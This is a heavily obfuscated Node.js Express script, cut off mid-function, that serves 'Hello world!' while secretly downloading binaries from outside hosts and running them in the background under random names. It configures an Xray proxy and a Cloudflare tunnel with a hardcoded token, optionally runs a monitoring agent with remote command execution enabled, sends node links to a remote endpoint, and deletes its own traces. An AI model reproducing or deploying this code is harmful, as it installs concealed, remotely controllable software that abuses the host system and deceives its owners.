const _0x36d523=_0x1268;(function(_0x3fba55,_0x5d8008){const _0x199b7b={_0x5fdb36:0x23f,_0x10ce8d:0x1dd,_0x3c4d73:0x1a5,_0x117d4b:0x235,_0x2ca5ca:0x18a,_0x4ab5f2:0x1ff},_0x3d0d1f=_0x1268,_0xa38615=_0x3fba55();while(!![]){try{const _0x15d667=-parseInt(_0x3d0d1f(0x19e))/0x1*(-parseInt(_0x3d0d1f(_0x199b7b._0x5fdb36))/0x2)+parseInt(_0x3d0d1f(_0x199b7b._0x10ce8d))/0x3+-parseInt(_0x3d0d1f(0x1cf))/0x4+parseInt(_0x3d0d1f(0x1c8))/0x5+-parseInt(_0x3d0d1f(_0x199b7b._0x3c4d73))/0x6*(parseInt(_0x3d0d1f(0x1ae))/0x7)+-parseInt(_0x3d0d1f(_0x199b7b._0x117d4b))/0x8+-parseInt(_0x3d0d1f(_0x199b7b._0x2ca5ca))/0x9*(-parseInt(_0x3d0d1f(_0x199b7b._0x4ab5f2))/0xa);if(_0x15d667===_0x5d8008)break;else _0xa38615['push'](_0xa38615['shift']());}catch(_0x4e87bb){_0xa38615['push'](_0xa38615['shift']());}}}(_0x234f,0xd1dee));const express=require(_0x36d523(0x1c7)),app=express(),axios=require(_0x36d523(0x241)),os=require('os'),fs=require('fs'),path=require(_0x36d523(0x198)),{promisify}=require(_0x36d523(0x18b)),exec=promisify(require(_0x36d523(0x1ab))[_0x36d523(0x1e2)]),{execSync}=require(_0x36d523(0x1ab)),UPLOAD_URL=process['env'][_0x36d523(0x1d8)]||'',PROJECT_URL=process[_0x36d523(0x222)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x36d523(0x222)][_0x36d523(0x21b)]||![],FILE_PATH=process['env'][_0x36d523(0x1bf)]||'./tmp',SUB_PATH=process[_0x36d523(0x222)][_0x36d523(0x22d)]||_0x36d523(0x183),PORT=process[_0x36d523(0x222)]['SERVER_PORT']||process[_0x36d523(0x222)]['PORT']||0xbb8,UUID=process[_0x36d523(0x222)][_0x36d523(0x19a)]||_0x36d523(0x196),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x36d523(0x222)][_0x36d523(0x191)]||'',NEZHA_KEY=process[_0x36d523(0x222)][_0x36d523(0x1cc)]||'',ARGO_DOMAIN=process[_0x36d523(0x222)][_0x36d523(0x20a)]||_0x36d523(0x218),ARGO_AUTH=process[_0x36d523(0x222)][_0x36d523(0x1fa)]||_0x36d523(0x187),ARGO_PORT=process[_0x36d523(0x222)]['ARGO_PORT']||0x1f41,CFIP=process[_0x36d523(0x222)][_0x36d523(0x17e)]||_0x36d523(0x1eb),CFPORT=process[_0x36d523(0x222)][_0x36d523(0x184)]||0x1bb,NAME=process[_0x36d523(0x222)][_0x36d523(0x182)]||_0x36d523(0x221);!fs[_0x36d523(0x18d)](FILE_PATH)?(fs[_0x36d523(0x216)](FILE_PATH),console['log'](FILE_PATH+_0x36d523(0x239))):console[_0x36d523(0x190)](FILE_PATH+'\x20already\x20exists');function _0x1268(_0x30dd5e,_0x27d924){const _0x234feb=_0x234f();return _0x1268=function(_0x1268ff,_0x581fb4){_0x1268ff=_0x1268ff-0x17c;let _0x499087=_0x234feb[_0x1268ff];return _0x499087;},_0x1268(_0x30dd5e,_0x27d924);}function generateRandomName(){const _0x10c401={_0x37a224:0x1c5,_0x5758bc:0x189,_0x17fa53:0x217,_0x29615e:0x23b},_0x58ce5d=_0x36d523,_0x3234b8='abcdefghijklmnopqrstuvwxyz';let _0x3f47dc='';for(let _0x1ba356=0x0;_0x1ba356<0x6;_0x1ba356++){_0x3f47dc+=_0x3234b8[_0x58ce5d(_0x10c401._0x37a224)](Math[_0x58ce5d(_0x10c401._0x5758bc)](Math[_0x58ce5d(_0x10c401._0x17fa53)]()*_0x3234b8[_0x58ce5d(_0x10c401._0x29615e)]));}return _0x3f47dc;}function _0x234f(){const _0x45731b=['floor','3357PhQAoG','util','basename','existsSync','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://arm64.ssss.nyc.mn/web','log','NEZHA_PORT','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','test','Download\x20','unlinkSync','e78ecbe1-0ba8-4eb2-8e16-deed75fa4550','/api/add-subscriptions','path','--tls','UUID','readdirSync','catch','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','33487ihznLz','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','aarch64','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','127.0.0.1','&fp=firefox&type=ws&host=','\x0avless://','24MzPNFm','https://arm64.ssss.nyc.mn/v1','none','\x20is\x20running','isFile','stringify','child_process','platform','win32','620263oTGlkA','ARGO_DOMAIN:','nohup\x20','tls','quic','Error\x20executing\x20command:\x20','match','false','clear','freedom','Unhandled\x20error\x20in\x20startserver:','http\x20server\x20is\x20running\x20on\x20port:','send','tcp','application/json','from','/dev/null','FILE_PATH','https://oooo.serv00.net/add-url','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','arm64','.exe\x20>\x20nul\x202>&1','php\x20running\x20error:\x20','charAt','&path=%2Fvless-argo%3Fed%3D2560#','express','5318245MSnSSG','response','https+local://8.8.8.8/dns-query','substring','NEZHA_KEY','tunnel.json','blackhole','4590388cOCQgE','split','vless','xtls-rprx-vision','set','\x0a\x0atrojan://','block','country_code','2096','UPLOAD_URL','trojan','Content-Type','rm\x20-rf\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','4943205EpVBbf','\x0a\x20\x20\x20\x20','App\x20is\x20running','writeFileSync','pop','exec','\x20-c\x20\x22','\x22\x20>\x20/dev/null\x202>&1','/trojan-argo','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','map','toString','base64','del\x20/f\x20/q\x20','cdns.doon.eu.org','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','taskkill\x20/f\x20/im\x20','post','includes','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Empowerment\x20failed\x20for\x20','message','?security=tls&sni=','/vless-argo','web\x20running\x20error:\x20','org','Error\x20reading\x20boot.log:','config.yaml','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','ARGO_AUTH','\x20-c\x20','createWriteStream','join','push','17520gjhQVw','Nodes\x20uploaded\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','2087','readFileSync','all','success','vmess','2053','config.json','Skipping\x20adding\x20automatic\x20access\x20task','ARGO_DOMAIN','unlink','npm\x20running\x20error:\x20','\x20>\x20nul\x202>&1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2083','Unknown','close','\x0a\x0avmess://','error','listen','get','mkdirSync','random','pjwmtlbb.halou.eu.org','countryCode','Error\x20in\x20startserver:','AUTO_ACCESS','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','forEach','utf-8','443','fileUrl','bjwmtlbb','env','then','chmod','https://amd64.ssss.nyc.mn/web','8443','\x20-p\x20','https://amd64.ssss.nyc.mn/bot','finish','TunnelSecret','direct','http','SUB_PATH','/api/add-nodes','true','https://ipapi.co/json/','amd','stream','fileName','https://arm64.ssss.nyc.mn/bot','9097320nRnzFt','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','https://arm64.ssss.nyc.mn/agent','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20is\x20created','\x20>/dev/null\x202>&1\x20&','length','Error\x20downloading\x20files:','/vmess-argo?ed=2560','boot.log','8VcJDGR','data','axios','https://amd64.ssss.nyc.mn/v1','\x20successfully','/config.json\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','arch','CFIP','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x20\x20credentials-file:\x20','Empowerment\x20success\x20for\x20','NAME','sub','CFPORT','arm','status','eyJhIjoiMzRkYjk2YzZlNjQwZjM0YzA3NTc0NmM4OTc1NjgxODUiLCJ0IjoiMTAzMmE2ZjctZjY0NC00ZDAzLTg2YzMtODlkYjk2NzFhY2QyIiwicyI6Ik5HVXdObVJrTlRndE1UWXhOQzAwTnpSbExXSXlaV1F0TlRBNVl6QTRNbUUyTkRjdyJ9','unshift'];_0x234f=function(){return _0x45731b;};return _0x234f();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x36d523(0x1fd)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x36d523(0x1fd)](FILE_PATH,webName),botPath=path[_0x36d523(0x1fd)](FILE_PATH,botName),subPath=path[_0x36d523(0x1fd)](FILE_PATH,'sub.txt'),listPath=path[_0x36d523(0x1fd)](FILE_PATH,'list.txt'),bootLogPath=path[_0x36d523(0x1fd)](FILE_PATH,_0x36d523(0x23e)),configPath=path[_0x36d523(0x1fd)](FILE_PATH,_0x36d523(0x208));function deleteNodes(){const _0x55f1c5={_0x4fab43:0x1e8,_0x1be27a:0x1bc},_0x5c92ec=_0x36d523;try{if(!UPLOAD_URL)return;if(!fs[_0x5c92ec(0x18d)](subPath))return;let _0x2f392a;try{_0x2f392a=fs['readFileSync'](subPath,_0x5c92ec(0x21e));}catch{return null;}const _0x271c85=Buffer['from'](_0x2f392a,_0x5c92ec(0x1e9))[_0x5c92ec(_0x55f1c5._0x4fab43)](_0x5c92ec(0x21e)),_0x1a3746=_0x271c85['split']('\x0a')['filter'](_0x551411=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x551411));if(_0x1a3746[_0x5c92ec(0x23b)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x1a3746}),{'headers':{'Content-Type':_0x5c92ec(_0x55f1c5._0x1be27a)}})[_0x5c92ec(0x19c)](_0x5efdbc=>{return null;}),null;}catch(_0x579756){return null;}}function cleanupOldFiles(){const _0x543157={_0x1554c2:0x19b},_0x107b92={_0x54c63e:0x1a9,_0x4a1983:0x195},_0x56f80b=_0x36d523;try{const _0x9349cd=fs[_0x56f80b(_0x543157._0x1554c2)](FILE_PATH);_0x9349cd[_0x56f80b(0x21d)](_0x65eb16=>{const _0x51aa3a=_0x56f80b,_0x1dd070=path['join'](FILE_PATH,_0x65eb16);try{const _0x1bf220=fs['statSync'](_0x1dd070);_0x1bf220[_0x51aa3a(_0x107b92._0x54c63e)]()&&fs[_0x51aa3a(_0x107b92._0x4a1983)](_0x1dd070);}catch(_0x25ed53){}});}catch(_0x6badcc){}}app[_0x36d523(0x215)]('/',function(_0x342f79,_0xbe5bd2){const _0x4be496={_0x378f31:0x1ba},_0xbacb3c=_0x36d523;_0xbe5bd2[_0xbacb3c(_0x4be496._0x378f31)]('Hello\x20world!');});async function generateConfig(){const _0x494512={_0x50c396:0x1be,_0x502908:0x1be,_0x20e9bb:0x1a7,_0x380684:0x1d2,_0xcbe150:0x1a7,_0x2c1c79:0x1bb,_0x1ffb04:0x1d1,_0x5a1512:0x1b2,_0x2b613e:0x1a2,_0xf8f8a8:0x1d9,_0xc00040:0x22c,_0x3c3f85:0x1ca,_0x59ac0c:0x1b7,_0x13ef42:0x22b,_0x5d9fae:0x1ce},_0x388a69=_0x36d523,_0x523414={'log':{'access':_0x388a69(_0x494512._0x50c396),'error':_0x388a69(_0x494512._0x502908),'loglevel':_0x388a69(_0x494512._0x20e9bb)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x388a69(0x1d1),'settings':{'clients':[{'id':UUID,'flow':_0x388a69(_0x494512._0x380684)}],'decryption':_0x388a69(_0x494512._0xcbe150),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x388a69(0x1e5),'dest':0xbbc}]},'streamSettings':{'network':_0x388a69(_0x494512._0x2c1c79)}},{'port':0xbb9,'listen':_0x388a69(0x1a2),'protocol':_0x388a69(0x1d1),'settings':{'clients':[{'id':UUID}],'decryption':_0x388a69(_0x494512._0xcbe150)},'streamSettings':{'network':_0x388a69(_0x494512._0x2c1c79),'security':_0x388a69(0x1a7)}},{'port':0xbba,'listen':_0x388a69(0x1a2),'protocol':_0x388a69(_0x494512._0x1ffb04),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x388a69(0x1f4)}},'sniffing':{'enabled':!![],'destOverride':[_0x388a69(0x22c),_0x388a69(0x1b1),_0x388a69(_0x494512._0x5a1512)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x388a69(0x1a2),'protocol':_0x388a69(0x206),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x388a69(0x22c),_0x388a69(0x1b1),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x388a69(_0x494512._0x2b613e),'protocol':_0x388a69(_0x494512._0xf8f8a8),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x388a69(0x1e5)}},'sniffing':{'enabled':!![],'destOverride':[_0x388a69(_0x494512._0xc00040),_0x388a69(0x1b1),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x388a69(_0x494512._0x3c3f85)]},'outbounds':[{'protocol':_0x388a69(_0x494512._0x59ac0c),'tag':_0x388a69(_0x494512._0x13ef42)},{'protocol':_0x388a69(_0x494512._0x5d9fae),'tag':_0x388a69(0x1d5)}]};fs['writeFileSync'](path['join'](FILE_PATH,_0x388a69(0x208)),JSON[_0x388a69(0x1aa)](_0x523414,null,0x2));}function getSystemArchitecture(){const _0x59b8dc={_0xe4fc71:0x1c2,_0x404dd6:0x185,_0x3765b8:0x231},_0x1c0411=_0x36d523,_0x125da2=os[_0x1c0411(0x17d)]();return _0x125da2===_0x1c0411(0x185)||_0x125da2===_0x1c0411(_0x59b8dc._0xe4fc71)||_0x125da2===_0x1c0411(0x1a0)?_0x1c0411(_0x59b8dc._0x404dd6):_0x1c0411(_0x59b8dc._0x3765b8);}function downloadFile(_0x13c906,_0x37b986,_0x36cf28){const _0x18eef4={_0x3dfefb:0x216,_0x51fe0c:0x1fc,_0x4a550c:0x215,_0x96af74:0x232},_0x24c9ff={_0x5e92e1:0x194},_0x121489={_0x572c34:0x211},_0x58d052=_0x36d523,_0x50be37=_0x13c906;!fs['existsSync'](FILE_PATH)&&fs[_0x58d052(_0x18eef4._0x3dfefb)](FILE_PATH,{'recursive':!![]});const _0x578852=fs[_0x58d052(_0x18eef4._0x51fe0c)](_0x50be37);axios({'method':_0x58d052(_0x18eef4._0x4a550c),'url':_0x37b986,'responseType':_0x58d052(_0x18eef4._0x96af74)})[_0x58d052(0x223)](_0x2ea650=>{const _0x40854f={_0xb80f7f:0x20b,_0x344b9d:0x18c,_0x3d5f89:0x1f2,_0x10d042:0x213},_0x435353=_0x58d052;_0x2ea650['data']['pipe'](_0x578852),_0x578852['on'](_0x435353(0x229),()=>{const _0x53e2f9=_0x435353;_0x578852[_0x53e2f9(_0x121489._0x572c34)](),console[_0x53e2f9(0x190)](_0x53e2f9(0x194)+path[_0x53e2f9(0x18c)](_0x50be37)+_0x53e2f9(0x243)),_0x36cf28(null,_0x50be37);}),_0x578852['on'](_0x435353(0x213),_0x1fa27e=>{const _0x3d4118=_0x435353;fs[_0x3d4118(_0x40854f._0xb80f7f)](_0x50be37,()=>{});const _0x3eaee0=_0x3d4118(0x194)+path[_0x3d4118(_0x40854f._0x344b9d)](_0x50be37)+_0x3d4118(0x17c)+_0x1fa27e[_0x3d4118(_0x40854f._0x3d5f89)];console[_0x3d4118(_0x40854f._0x10d042)](_0x3eaee0),_0x36cf28(_0x3eaee0);});})[_0x58d052(0x19c)](_0x18f554=>{const _0x2ddd30=_0x58d052,_0x3a3869=_0x2ddd30(_0x24c9ff._0x5e92e1)+path[_0x2ddd30(0x18c)](_0x50be37)+_0x2ddd30(0x17c)+_0x18f554['message'];console[_0x2ddd30(0x213)](_0x3a3869),_0x36cf28(_0x3a3869);});}async function downloadFilesAndRun(){const _0x5a119a={_0x264d1c:0x23b,_0x4b2e2c:0x17f,_0x5f3476:0x1e7,_0xfe50ee:0x1ef,_0x1d9d9f:0x1d0,_0x58cc6a:0x1e1,_0x461243:0x21f,_0x578533:0x20f,_0x29681b:0x207,_0x129aec:0x22f,_0xa129c9:0x20e,_0x586ed9:0x19d,_0xbe84f1:0x1e0,_0x28f31c:0x1f8,_0x415735:0x1e3,_0x4ca184:0x213,_0x2d4acb:0x1c4,_0x30fec6:0x207,_0x589027:0x1b0,_0x18c830:0x238,_0x2b9f5a:0x20c,_0x3b1653:0x201,_0x257b09:0x1fb,_0x203822:0x190,_0x32b9f9:0x213,_0x391224:0x1f5,_0x1f1f21:0x18e,_0x4fa3d7:0x19f,_0x5ad2c1:0x23a,_0x828200:0x190,_0x2dfeee:0x213},_0x15726a={_0x3b3c00:0x18d},_0x5c5da3=_0x36d523,_0x42defa=getSystemArchitecture(),_0xd85cc6=getFilesForArchitecture(_0x42defa);if(_0xd85cc6[_0x5c5da3(_0x5a119a._0x264d1c)]===0x0){console[_0x5c5da3(0x190)](_0x5c5da3(_0x5a119a._0x4b2e2c));return;}const _0x321bc9=_0xd85cc6[_0x5c5da3(_0x5a119a._0x5f3476)](_0xeae2b1=>{const _0xc05949={_0x5e4ce6:0x233,_0x3a01ac:0x220};return new Promise((_0x4cd295,_0x12870c)=>{const _0x127699=_0x1268;downloadFile(_0xeae2b1[_0x127699(_0xc05949._0x5e4ce6)],_0xeae2b1[_0x127699(_0xc05949._0x3a01ac)],(_0x12e5da,_0x27010c)=>{_0x12e5da?_0x12870c(_0x12e5da):_0x4cd295(_0x27010c);});});});try{await Promise[_0x5c5da3(0x204)](_0x321bc9);}catch(_0x21e6e3){console[_0x5c5da3(0x213)](_0x5c5da3(0x23c),_0x21e6e3);return;}function _0x558d42(_0x1f5fd1){const _0x443ae1=_0x5c5da3,_0x560fbc=0x1fd;_0x1f5fd1[_0x443ae1(0x21d)](_0x162576=>{const _0x19b2f2=_0x443ae1;fs[_0x19b2f2(_0x15726a._0x3b3c00)](_0x162576)&&fs[_0x19b2f2(0x224)](_0x162576,_0x560fbc,_0x357d0b=>{const _0x34e7a4=_0x19b2f2;_0x357d0b?console[_0x34e7a4(0x213)](_0x34e7a4(0x1f1)+_0x162576+':\x20'+_0x357d0b):console[_0x34e7a4(0x190)](_0x34e7a4(0x181)+_0x162576+':\x20'+_0x560fbc[_0x34e7a4(0x1e8)](0x8));});});}const _0x4065d2=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x558d42(_0x4065d2);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x264498=NEZHA_SERVER[_0x5c5da3(_0x5a119a._0xfe50ee)](':')?NEZHA_SERVER[_0x5c5da3(_0x5a119a._0x1d9d9f)](':')[_0x5c5da3(_0x5a119a._0x58cc6a)]():'',_0x303cb4=new Set([_0x5c5da3(_0x5a119a._0x461243),_0x5c5da3(0x226),'2096',_0x5c5da3(0x202),_0x5c5da3(_0x5a119a._0x578533),_0x5c5da3(_0x5a119a._0x29681b)]),_0x35b874=_0x303cb4['has'](_0x264498)?_0x5c5da3(_0x5a119a._0x129aec):_0x5c5da3(0x1b5),_0x2a6a82='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5c5da3(_0x5a119a._0xa129c9)+NEZHA_SERVER+_0x5c5da3(0x1f9)+_0x35b874+_0x5c5da3(_0x5a119a._0x586ed9)+UUID;fs[_0x5c5da3(_0x5a119a._0xbe84f1)](path['join'](FILE_PATH,_0x5c5da3(_0x5a119a._0x28f31c)),_0x2a6a82);const _0x4610b8='nohup\x20'+phpPath+_0x5c5da3(_0x5a119a._0x415735)+FILE_PATH+_0x5c5da3(0x1dc);try{await exec(_0x4610b8),console['log'](phpName+_0x5c5da3(0x1a8)),await new Promise(_0x11d57f=>setTimeout(_0x11d57f,0x3e8));}catch(_0x4e840d){console[_0x5c5da3(_0x5a119a._0x4ca184)](_0x5c5da3(_0x5a119a._0x2d4acb)+_0x4e840d);}}else{let _0x4ac373='';const _0x127752=[_0x5c5da3(0x21f),_0x5c5da3(0x226),_0x5c5da3(0x1d7),_0x5c5da3(0x202),'2083',_0x5c5da3(_0x5a119a._0x30fec6)];_0x127752[_0x5c5da3(0x1ef)](NEZHA_PORT)&&(_0x4ac373=_0x5c5da3(0x199));const _0x7e8e55=_0x5c5da3(_0x5a119a._0x589027)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5c5da3(0x227)+NEZHA_KEY+'\x20'+_0x4ac373+_0x5c5da3(_0x5a119a._0x18c830);try{await exec(_0x7e8e55),console['log'](npmName+_0x5c5da3(0x1a8)),await new Promise(_0x174af9=>setTimeout(_0x174af9,0x3e8));}catch(_0x47eefe){console['error'](_0x5c5da3(_0x5a119a._0x2b9f5a)+_0x47eefe);}}}else console[_0x5c5da3(0x190)](_0x5c5da3(_0x5a119a._0x3b1653));const _0x4b0f17=_0x5c5da3(_0x5a119a._0x589027)+webPath+_0x5c5da3(_0x5a119a._0x257b09)+FILE_PATH+_0x5c5da3(0x244);try{await exec(_0x4b0f17),console[_0x5c5da3(_0x5a119a._0x203822)](webName+_0x5c5da3(0x1a8)),await new Promise(_0x25c7df=>setTimeout(_0x25c7df,0x3e8));}catch(_0x1895ff){console[_0x5c5da3(_0x5a119a._0x32b9f9)](_0x5c5da3(_0x5a119a._0x391224)+_0x1895ff);}if(fs[_0x5c5da3(0x18d)](botPath)){let _0x48c999;if(ARGO_AUTH[_0x5c5da3(0x1b4)](/^[A-Z0-9a-z=]{120,250}$/))_0x48c999=_0x5c5da3(_0x5a119a._0x1f1f21)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x48c999=_0x5c5da3(0x1ec)+FILE_PATH+'/tunnel.yml\x20run':_0x48c999=_0x5c5da3(0x21c)+FILE_PATH+_0x5c5da3(_0x5a119a._0x4fa3d7)+ARGO_PORT;try{await exec(_0x5c5da3(_0x5a119a._0x589027)+botPath+'\x20'+_0x48c999+_0x5c5da3(_0x5a119a._0x5ad2c1)),console[_0x5c5da3(_0x5a119a._0x828200)](botName+'\x20is\x20running'),await new Promise(_0x281e2d=>setTimeout(_0x281e2d,0x7d0));}catch(_0x10cdde){console[_0x5c5da3(_0x5a119a._0x2dfeee)](_0x5c5da3(0x1b3)+_0x10cdde);}}await new Promise(_0x3c96b7=>setTimeout(_0x3c96b7,0x1388));}function getFilesForArchitecture(_0x3177fa){const _0x5b412c={_0x5e3373:0x185,_0x56d410:0x234,_0x4fb446:0x228,_0x130858:0x237},_0x396615=_0x36d523;let _0x4f052e;_0x3177fa===_0x396615(_0x5b412c._0x5e3373)?_0x4f052e=[{'fileName':webPath,'fileUrl':_0x396615(0x18f)},{'fileName':botPath,'fileUrl':_0x396615(_0x5b412c._0x56d410)}]:_0x4f052e=[{'fileName':webPath,'fileUrl':_0x396615(0x225)},{'fileName':botPath,'fileUrl':_0x396615(_0x5b412c._0x4fb446)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4ca2e4=_0x3177fa==='arm'?_0x396615(_0x5b412c._0x130858):'https://amd64.ssss.nyc.mn/agent';_0x4f052e[_0x396615(0x188)]({'fileName':npmPath,'fileUrl':_0x4ca2e4});}else{const _0x23de82=_0x3177fa===_0x396615(_0x5b412c._0x5e3373)?_0x396615(0x1a6):_0x396615(0x242);_0x4f052e[_0x396615(0x188)]({'fileName':phpPath,'fileUrl':_0x23de82});}}return _0x4f052e;}function argoType(){const _0x4458ec={_0x300950:0x1ef,_0xdf9a8f:0x1e0,_0x4fc485:0x1fd,_0x2565a7:0x1cd,_0x5eafbd:0x180,_0x130905:0x1a1,_0x2d0e65:0x236,_0x5ee863:0x1e6},_0x2510cf=_0x36d523;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x2510cf(0x1c1));return;}if(ARGO_AUTH[_0x2510cf(_0x4458ec._0x300950)](_0x2510cf(0x22a))){fs[_0x2510cf(_0x4458ec._0xdf9a8f)](path[_0x2510cf(_0x4458ec._0x4fc485)](FILE_PATH,_0x2510cf(_0x4458ec._0x2565a7)),ARGO_AUTH);const _0x29490b='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x2510cf(0x1d0)]('\x22')[0xb]+_0x2510cf(_0x4458ec._0x5eafbd)+path[_0x2510cf(0x1fd)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x2510cf(_0x4458ec._0x130905)+ARGO_PORT+_0x2510cf(_0x4458ec._0x2d0e65);fs[_0x2510cf(0x1e0)](path[_0x2510cf(0x1fd)](FILE_PATH,'tunnel.yml'),_0x29490b);}else console[_0x2510cf(0x190)](_0x2510cf(_0x4458ec._0x5ee863));}async function extractDomains(){const _0x41bb0a={_0x1f7718:0x190,_0x2a6fbb:0x1af,_0x4520e9:0x21e,_0x13abe9:0x192,_0x1b3db8:0x195,_0x59a704:0x1fd,_0x101426:0x23e,_0x4d95c5:0x21c,_0x3eaf9f:0x1b0,_0x38adfc:0x23a},_0x3e06c5={_0x18081c:0x215,_0x38403e:0x230,_0x36999d:0x1d6,_0x21b17a:0x240,_0x35fd47:0x240,_0x5abf12:0x186,_0x408201:0x205,_0x31b61a:0x219,_0x5be719:0x240,_0x3789f0:0x1f6,_0x3e308c:0x210},_0x41d592={_0x17573a:0x1ed,_0x143794:0x1c3,_0x3d8b13:0x1c5},_0x4d000a={_0x68aed4:0x1b4},_0x12a8c2=_0x36d523;let _0x321cb4;if(ARGO_AUTH&&ARGO_DOMAIN)_0x321cb4=ARGO_DOMAIN,console[_0x12a8c2(_0x41bb0a._0x1f7718)](_0x12a8c2(_0x41bb0a._0x2a6fbb),_0x321cb4),await _0x263851(_0x321cb4);else try{const _0x45a280=fs['readFileSync'](path[_0x12a8c2(0x1fd)](FILE_PATH,_0x12a8c2(0x23e)),_0x12a8c2(_0x41bb0a._0x4520e9)),_0x109d1b=_0x45a280[_0x12a8c2(0x1d0)]('\x0a'),_0x5a7e8b=[];_0x109d1b['forEach'](_0xf304cc=>{const _0x108c80=_0x12a8c2,_0x4efcd5=_0xf304cc[_0x108c80(_0x4d000a._0x68aed4)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4efcd5){const _0x128764=_0x4efcd5[0x1];_0x5a7e8b['push'](_0x128764);}});if(_0x5a7e8b[_0x12a8c2(0x23b)]>0x0)_0x321cb4=_0x5a7e8b[0x0],console[_0x12a8c2(0x190)]('ArgoDomain:',_0x321cb4),await _0x263851(_0x321cb4);else{console[_0x12a8c2(0x190)](_0x12a8c2(_0x41bb0a._0x13abe9)),fs[_0x12a8c2(_0x41bb0a._0x1b3db8)](path[_0x12a8c2(_0x41bb0a._0x59a704)](FILE_PATH,_0x12a8c2(_0x41bb0a._0x101426)));async function _0x98a2be(){const _0x78a65e=_0x12a8c2;try{process[_0x78a65e(0x1ac)]===_0x78a65e(0x1ad)?await exec(_0x78a65e(_0x41d592._0x17573a)+botName+_0x78a65e(_0x41d592._0x143794)):await exec('pkill\x20-f\x20\x22['+botName[_0x78a65e(_0x41d592._0x3d8b13)](0x0)+']'+botName[_0x78a65e(0x1cb)](0x1)+_0x78a65e(0x1e4));}catch(_0x407e98){}}_0x98a2be(),await new Promise(_0x483e36=>setTimeout(_0x483e36,0xbb8));const _0x3a0926=_0x12a8c2(_0x41bb0a._0x4d95c5)+FILE_PATH+_0x12a8c2(0x19f)+ARGO_PORT;try{await exec(_0x12a8c2(_0x41bb0a._0x3eaf9f)+botPath+'\x20'+_0x3a0926+_0x12a8c2(_0x41bb0a._0x38adfc)),console['log'](botName+_0x12a8c2(0x1a8)),await new Promise(_0x14fe3c=>setTimeout(_0x14fe3c,0xbb8)),await extractDomains();}catch(_0x3e9032){console[_0x12a8c2(0x213)](_0x12a8c2(0x1b3)+_0x3e9032);}}}catch(_0x280a3b){console[_0x12a8c2(0x213)](_0x12a8c2(0x1f7),_0x280a3b);}async function _0x3ec51d(){const _0x6dc81f=_0x12a8c2;try{const _0x318a07=await axios[_0x6dc81f(_0x3e06c5._0x18081c)](_0x6dc81f(_0x3e06c5._0x38403e),{'timeout':0xbb8});if(_0x318a07[_0x6dc81f(0x240)]&&_0x318a07['data'][_0x6dc81f(_0x3e06c5._0x36999d)]&&_0x318a07[_0x6dc81f(0x240)][_0x6dc81f(0x1f6)])return _0x318a07[_0x6dc81f(_0x3e06c5._0x21b17a)]['country_code']+'_'+_0x318a07[_0x6dc81f(_0x3e06c5._0x35fd47)][_0x6dc81f(0x1f6)];}catch(_0x120362){try{const _0x1e47dd=await 